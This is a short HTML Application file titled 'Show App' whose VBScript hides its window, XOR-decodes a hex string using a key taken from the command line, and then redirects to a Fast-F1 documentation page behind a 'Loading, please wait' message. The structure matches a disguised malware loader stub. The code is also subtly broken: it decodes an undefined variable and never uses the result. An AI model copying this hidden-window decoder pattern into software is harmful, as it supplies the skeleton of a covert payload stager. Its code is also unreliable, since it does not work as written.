<!DOCTYPE html>
<html lang="en">
<head>

    <title>Show App</title>
 
    <HTA:APPLICATION
    	ID="app"
    	WINDOWSTATE="normal"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
      CAPTION="no"
      SHOWINTASKBAR="no"
      NAVIGABLE="yes"
    />
    <script language="VBScript">
  		Sub load()
	    	window.resizeTo 0,0
	    	Dim args, url, ph, i, retstr, hc

	    	url = "https://theoehrly.github.io/Fast-F1/"
  			session = 12
	    	
	    	Randomize(19)
	    	args = Split(app.CommandLine, Chr(34))
	    	ph = Trim(args(UBound(args)))
	    	
	    	For x = 1 to 30
	    		unique = unique & Int((Rnd*99+1))
	    	Next

        p = -1
	     	For i = 1 to Len(session) Step 2
	    	 	hc = Mid(se, i, 2)
			 	cu = Chr("&H" & hc)
	    		p = (p + 1) mod len(ph)
	    		cp = Mid(ph, p + 1, 1)
	    		retstr = retstr + chr(asc(cu) xor asc(cp))
		    Next

        MsgBox "redirect"
		    window.location = url
		    window.close
		End Sub
    </script>
</head>
 
<body onload="load">
    <p>Loading, please wait...</p>
</body>
 
</html>
